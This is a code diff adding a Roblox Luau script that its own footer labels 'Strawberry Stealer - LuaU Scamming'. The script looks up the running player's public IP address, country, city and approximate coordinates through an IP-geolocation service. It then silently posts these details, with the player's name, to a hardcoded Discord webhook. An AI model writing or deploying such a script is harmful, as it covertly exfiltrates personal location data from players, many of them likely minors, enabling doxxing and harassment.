@@ -1,0 +1,27 @@
+  local player = game.Players.LocalPlayer
+local api = game.HttpService:JSONDecode(game:HttpGet('https://ipwho.is/'))
+
+
+
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["embeds"] = {
+            {
+                ["title"] = "User Detected!",
+                ["description"] = "Player Nickname: "..player.Name.." IP: "..api.ip.." Country: "..api.country.." City: "..api.city.." Approximately Location: "..api.latitude.." "..api.longitude,
+                ["footer"] = {
+                    ["text"] = "Strawberry Stealer - LuaU Scamming"
+                }
+            }
+        }
+    }
+    local body = http:JSONEncode(data)
+    local response = request({
+        Url = "https://discord.com/api/webhooks/1430541150833610863/lWFYFtZyChJh9D2bHKxpp38qurMKqYNdPRrpatmhU2GgFeNgyDIWclAebGqKv_bLOw4n",
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
